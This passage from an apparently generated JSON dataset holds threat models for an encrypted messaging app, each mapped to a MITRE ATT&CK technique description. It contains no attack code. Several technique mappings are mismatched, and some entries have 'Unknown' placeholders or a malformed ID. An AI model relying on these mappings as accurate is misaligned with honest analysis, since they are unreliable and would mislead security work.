                    "Assumption": "The attacker has access to users' devices through compromised accounts.",
                    "Role": "Attacker",
                    "Condition": "Successful phishing leading to compromised device accounts."
                }
            ],
            "Potential Impact": "Compromise of user accounts and access to encrypted communications.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Key Theft",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial-of-Service (DDoS) attack against the server infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Servers are not equipped to handle excessive traffic.",
                    "Role": "Administrator",
                    "Condition": "Lack of appropriate scaling and traffic management."
                },
                {
                    "Assumption": "The application does not have effective DDoS mitigation mechanisms.",
                    "Role": "Developer",
                    "Condition": "Absence of DDoS protection services and strategies."
                },
                {
                    "Assumption": "The attacker has access to a large botnet to generate traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker controls a significant number of compromised devices."
                }
            ],
            "Potential Impact": "Service unavailability and disruption, leading to loss of availability.",
            "MITRE ATT&CK Keywords": [
                "Botnet",
                "Traffic Flooding",
                "Network Saturation",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability to cause the messaging application to crash repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "The application has an unpatched vulnerability that can be exploited.",
                    "Role": "Developer",
                    "Condition": "Vulnerability exists and is known to the attacker."
                },
                {
                    "Assumption": "The attacker has the knowledge to craft an exploit payload.",
                    "Role": "Attacker",
                    "Condition": "Attacker is technically proficient and aware of the vulnerability."
                },
                {
                    "Assumption": "There are no safeguards to recover from such crashes automatically.",
                    "Role": "Administrator",
                    "Condition": "Lack of proper application resilience and monitoring."
                }
            ],
            "Potential Impact": "Repeated crashes leading to service disruption and loss of availability.",
            "MITRE ATT&CK Keywords": [
                "Application Crash",
                "Memory Corruption",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends a malformed message payload that exploits protocol handling to cause a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "The messaging protocol has weaknesses in handling malformed data.",
                    "Role": "Developer",
                    "Condition": "Improper validation and error-handling in the protocol."
                },
                {
                    "Assumption": "The attacker can craft such a malicious payload.",
                    "Role": "Attacker",
                    "Condition": "Attacker understands the protocol and can send custom messages."
                },
                {
                    "Assumption": "There are no effective filtering or validation mechanisms in place.",
                    "Role": "Developer",
                    "Condition": "Lack of robust data validation checks on the server side."
                }
            ],
            "Potential Impact": "Service disruption and potential crashes, leading to loss of availability.",
            "MITRE ATT&CK Keywords": [
                "Malformed Packet",
                "Protocol Exploitation",
                "Service Disruption",
                "Input Validation Failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0000-da97-1bb6-3b190-94257fdbc660",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the desktop client to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client has a known privilege escalation vulnerability.",
                    "Role": "Developer",
                    "Condition": "Vulnerability is unpatched or undiscovered."
                },
                {
                    "Assumption": "The attacker possesses the knowledge to exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Attacker is aware of the vulnerability and has the capability."
                },
                {
                    "Assumption": "Users run the desktop client with high privileges (e.g., administrative).",
                    "Role": "User",
                    "Condition": "Common practice of running applications with high privileges."
                }
            ],
            "Potential Impact": "Compromise of the device integrity and unauthorized actions, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Vulnerability Exploitation",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick a user into executing a script that grants the attacker elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Lack of security awareness and training."
                },
                {
                    "Assumption": "The system lacks effective execution controls for scripts.",
                    "Role": "Developer",
                    "Condition": "Absence of script execution policies and controls."
                },
                {
                    "Assumption": "The attacker has crafted a convincing malicious script.",
                    "Role": "Attacker",
                    "Condition": "Attacker creates a believable context for the script."
                }
            ],
            "Potential Impact": "Unauthorized access to system resources and data, potentially leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "Social Engineering",
                "Script Execution",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker discovers and exploits a flaw in the key management system to gain higher access than intended.",
            "Assumptions": [
                {
                    "Assumption": "The key management system contains exploitable flaws.",
                    "Role": "Developer",
                    "Condition": "Key management system is improperly designed or implemented."
                },
                {
                    "Assumption": "The attacker has knowledge of the weakness in the key management.",
                    "Role": "Attacker",
                    "Condition": "Attacker has analyzed or reverse-engineered the system."
                },
                {
                    "Assumption": "There are no secondary controls to detect or prevent such privilege escalation.",
                    "Role": "Administrator",
                    "Condition": "Lack of monitoring and secondary access controls."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system functionalities.",
            "MITRE ATT&CK Keywords": [
                "Key Management Exploitation",
                "Unauthorized Access",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sets up a fake messaging application that mimics one of the legitimate apps (e.g., Signal) to trick users into using it.",
            "Assumptions": [
                {
                    "Assumption": "Users are not able to distinguish between the fake and legitimate application.",
                    "Role": "Users",
                    "Condition": "Users download and install applications from unofficial sources."
                },
                {
                    "Assumption": "The attacker has the resources to create a realistic replica.",
                    "Role": "Attacker",
                    "Condition": "The attacker can develop or source a fake application."
                },
                {
                    "Assumption": "Application stores do not detect and remove the fakes promptly.",
                    "Role": "Application Store",
                    "Condition": "The fake application circumvents security checks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communications, identity theft, data compromise.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "credential harvesting",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker hijacks DNS to redirect users to a fake website for account setup, capturing their public/private key pairs.",
            "Assumptions": [
                {
                    "Assumption": "DNS settings can be manipulated by the attacker.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the capability to perform DNS poisoning."
                },
                {
                    "Assumption": "Users do not notice the URL discrepancy.",
                    "Role": "Users",
                    "Condition": "Users do not verify the URL carefully."
                },
                {
                    "Assumption": "The fake website convincingly mimics the legitimate one.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the resources to create a realistic replica website."
                }
            ],
            "Potential Impact": "Compromise of user key pairs, unauthorized access to communications.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "DNS hijacking",
                "credential harvesting",
                "network",
                "website"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts message delivery and replaces a legitimate message recipient's public key with their own.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can perform a man-in-the-middle attack.",
                    "Role": "Attacker",
                    "Condition": "The attacker can intercept and alter communication paths."
                },
                {
                    "Assumption": "The application does not have strong key verification.",
                    "Role": "Application",
                    "Condition": "Weak or absent key verification mechanisms."
                },
                {
                    "Assumption": "Users do not manually verify keys.",
                    "Role": "Users",
                    "Condition": "Users rely on automatic key verification."
                }
            ],
            "Potential Impact": "Hijacking of communication channels, eavesdropping.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "interception",
                "key replacement",
                "network",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to a user's device and modifies the encrypted SQLite database to inject malicious content.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the user's device.",
                    "Role": "Attacker",
                    "Condition": "The device is compromised or misused."
                },
                {
                    "Assumption": "The database encryption is not sufficiently robust.",
                    "Role": "Application",
                    "Condition": "Weak or flawed database encryption."
                },
                {
                    "Assumption": "Injected content can bypass application checks.",
                    "Role": "Application",
                    "Condition": "Insufficient integrity checks on accessing messages."
                }
            ],
            "Potential Impact": "Message corruption, integrity compromise, potential for executing malicious code.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "injection",
                "malware",
                "database",
                "device"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A compromised desktop client sends unauthorized commands to linked primary devices to manipulate message data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has control over a companion device.",
                    "Role": "Attacker",
                    "Condition": "A desktop client is compromised."
                },
                {
                    "Assumption": "The communication protocol allows for unauthorized commands.",
                    "Role": "Application",
                    "Condition": "Flaws or absence of integrity checks in command protocols."
                },
                {
                    "Assumption": "Primary devices trust commands from linked companions.",
                    "Role": "Primary Device",
                    "Condition": "Trust relationships are not properly validated."
                }
            ],
            "Potential Impact": "Potential data corruption, unauthorized data manipulation, integrity issues.",
            "MITRE ATT&CK Keywords": [
                "compromised device",
                "tampering",
                "command injection",
                "desktop client",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "The attacker intercepts software updates, injecting malicious code into new versions of the application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter the update mechanism.",
                    "Role": "Attacker",
                    "Condition": "Control or manipulation of the update distribution system."
                },
                {
                    "Assumption": "Update integrity checks are weak or nonexistent.",
                    "Role": "Application",
                    "Condition": "Lack of strong integrity verification for updates."
                },
                {
                    "Assumption": "Users install updates without checking for signatures.",
                    "Role": "Users",
                    "Condition": "Automatic or unverified update installations."
                }
            ],
            "Potential Impact": "Application compromise, potential malware introduction, data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "update hijacking",
                "malware",
                "software update",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific encrypted message, claiming the message was forged.",
            "Assumptions": [
                {
                    "Assumption": "Unclear logging mechanisms make it difficult to verify message origins.",
                    "Role": "Application",
                    "Condition": "Lack of non-repudiation features."
                },
                {
                    "Assumption": "The data can be accessed or manipulated.",
                    "Role": "User",
                    "Condition": "Users have some level of access to alter message data."
                },
                {
                    "Assumption": "No digital signatures appended to messages.",
                    "Role": "Application",
                    "Condition": "Absence of cryptographic message signing."
                }
            ],
            "Potential Impact": "Disputes in communication integrity, difficulty in ascertaining message authenticity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message integrity",
                "denial",
                "cryptography",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
                "technique_id": "T1588.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains access to logs and alters historical communication records.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored on a compromised device or accessible endpoint.",
                    "Role": "Application",
                    "Condition": "Sensitive logs are not adequately protected."
                },
                {
                    "Assumption": "No integrity checks are performed on the logs.",
                    "Role": "Application",
                    "Condition": "Absence of robust integrity mechanisms for stored logs."
                },
                {
                    "Assumption": "Access controls are insufficient on log storage.",
                    "Role": "Application",
                    "Condition": "Weak access control mechanisms on logging systems."
                }
            ],
            "Potential Impact": "Integrity compromise of log data, difficulty in auditing and tracing actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "audit trail",
                "compromised device",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
